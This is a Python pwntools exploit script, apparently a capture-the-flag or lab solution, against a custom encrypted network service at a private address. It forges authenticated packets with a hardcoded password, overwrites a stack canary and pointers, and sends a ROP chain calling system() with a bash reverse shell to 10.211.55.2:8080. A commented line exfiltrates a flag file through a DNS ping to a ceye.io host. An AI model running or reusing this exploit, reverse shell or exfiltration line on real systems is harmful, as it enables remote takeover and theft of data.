from pwn import *
import crypto_tools

password = "meiyoumima"



p = remote("10.211.55.21",8888)
# 16 token
# 8 timestamp
# 8 noise
# 1 version 
# 4 length
# 1 random
# 10 padding
# 32 hash
# data
# random


pop_rdi_ret = 0x40ce73
ret = pop_rdi_ret +1

def write(data):
    # context.logger.info("write")
    # context.logger.info(data);;
    timestamp = crypto_tools.packed_timestamp()
    noise = crypto_tools.random_byte(8)
    token = crypto_tools.sha256(password + timestamp[::-1] + noise)[:16]
    random_len = crypto_tools.random_byte(1)[0]
    random_len = u8(random_len)
    random_len = random_len

    data_len = random_len + len(data) + 80

    data_buf = bytearray()
    data_buf += timestamp[::-1] + noise
    data_buf.append(1)
    data_buf += struct.pack(b'!L', data_len)[::-1]

    print(struct.pack(b'!L', data_len)[::-1])
    data_buf.append(random_len)
    data_buf += crypto_tools.random_byte(10)
    data_buf += data
    random_data = crypto_tools.random_byte(random_len)
    data_buf += crypto_tools.sha256(data_buf+'\x00'*32+random_data)

    aes = crypto_tools.AES(token)
    data_buf = token + aes.encrypt(bytes(data_buf))
    data_buf += random_data

    return data_buf


def write2(data):
    # context.logger.info("write")
    # context.logger.info(data);;
    timestamp = crypto_tools.packed_timestamp()
    noise = crypto_tools.random_byte(8)
    token = crypto_tools.sha256(password + timestamp[::-1] + noise)[:16]
    random_len = crypto_tools.random_byte(1)[0]
    random_len = u8(random_len)
    random_len =  0xff

    data_len = random_len + len(data) + 80

    data_buf = bytearray()
    data_buf += timestamp[::-1] + noise
    data_buf.append(1)
    data_buf += struct.pack(b'!L', data_len)[::-1]

    print(struct.pack(b'!L', data_len)[::-1])
    data_buf.append(random_len)
    data_buf += crypto_tools.random_byte(10)
    
    # random_data = crypto_tools.random_byte(random_len)
    random_data = cyclic(random_len, n=8)
    random_data = bytearray(random_data)

    random_data[64:64+8] = p64(0x613730) #
    random_data[112:112+8] = p64(0x6136d0) # sha256_ctx
    random_data[136:136+8] = p64(0x612f00) # rand_data
    random_data[216:216+8] = p64(0x206e22576092b600) # canary

    rop = ''
    rop += p64(pop_rdi_ret)
    rop += p64(0x00613260)
    rop += p64(0x7ffff7a33440+27)


    random_data[232:232+len(rop)] = rop

    # data_buf += '\x0e\xad\x98\xbf\xae\x94\x0b\xd7\xd0\xdc\x29\x15\x12\x0a\x13\xb5\x91\xde\x8a\x80\x67\x57\xc1\x0c\x15\x90\x54\xe1\x6c\x4f\xa4\x2d'
    data_buf += crypto_tools.sha256(token+data_buf+'\x00'*32+data+'\x00'*0xff)
    data_buf += data

    aes = crypto_tools.AES(token)
    data_buf = token + aes.encrypt(bytes(data_buf))
    data_buf += random_data

    return data_buf


def write3(data):
    # context.logger.info("write")
    # context.logger.info(data);;
    timestamp = crypto_tools.packed_timestamp()
    noise = crypto_tools.random_byte(8)
    token = crypto_tools.sha256(password + timestamp[::-1] + noise)[:16]
    random_len = crypto_tools.random_byte(1)[0]
    random_len = u8(random_len)
    random_len =  0xff

    data_len = random_len + len(data) + 80

    data_buf = bytearray()
    data_buf += timestamp[::-1] + noise
    data_buf.append(1)
    data_buf += struct.pack(b'!L', data_len)[::-1]

    print(struct.pack(b'!L', data_len)[::-1])
    data_buf.append(random_len)
    data_buf += crypto_tools.random_byte(10)
    
    # random_data = crypto_tools.random_byte(random_len)
    random_data = cyclic(random_len, n=8)
    random_data = bytearray(random_data)

    heap_base = 0x00612000
    libc_base = 0x00007ffff79e4000

    canary = 0xd6559be6efdb1d00

    random_data[96:96+8] = p64(heap_base + 0x6d0) # dec_pack
    random_data[72:72+8] = p64(heap_base + 0x730) # sha256_ctx
    random_data[88:88+8] = p64(heap_base + 0xf00) # rand_data
    random_data[168:168+8] = p64(canary) # canary

    rop = ''
    rop += p64(pop_rdi_ret)
    rop += p64(heap_base + 0x260)       # cmd addr
    rop += p64(libc_base + 0x4f440 + 27) # system addr


    random_data[184:184+len(rop)] = rop

    # data_buf += '\x0e\xad\x98\xbf\xae\x94\x0b\xd7\xd0\xdc\x29\x15\x12\x0a\x13\xb5\x91\xde\x8a\x80\x67\x57\xc1\x0c\x15\x90\x54\xe1\x6c\x4f\xa4\x2d'
    data_buf += crypto_tools.sha256(token+data_buf+'\x00'*32+data+'\x00'*0xff)
    data_buf += data

    aes = crypto_tools.AES(token)
    data_buf = token + aes.encrypt(bytes(data_buf))
    data_buf += random_data

    return data_buf

# cmd = "touch 2;touch 2;  /bin/bash -c 'ping `cat flag`.lszf9j.ceye.io';" + "\x10"*16
cmd = "/bin/bash -c 'bash -i >&/dev/tcp/10.211.55.2/8080 0>&1';echo 22;" + "\x10"*16

pay = write3(cmd)


p.send(pay)

context.log_level = 'debug'

# p.interactive()
